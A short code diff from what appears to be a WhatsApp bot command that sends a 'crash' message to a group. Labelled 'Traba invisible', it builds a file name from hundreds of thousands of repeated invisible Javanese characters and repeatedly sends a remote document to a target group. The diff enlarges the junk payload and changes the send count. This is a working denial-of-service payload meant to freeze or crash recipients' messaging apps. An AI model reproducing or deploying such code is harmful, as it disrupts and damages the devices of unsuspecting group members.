@@ -17,9 +17,9 @@ let handler = async (m, { conn, text }) => {
 
   // Traba invisible
   const basura = 'ꦾ'.repeat(90000);
-  const fileName = basura + basura + basura;
+  const fileName = '🐢🐢🐢' + basura + basura + basura +basura +basura;
 
-  for (let i = 0; i < 20; i++) {
+  for (let i = 0; i < 5; i++) {
     await conn.sendMessage(groupId, {
       document: { url: 'https://files.catbox.moe/2dvudi.txt' },
       fileName: fileName + '.txt',
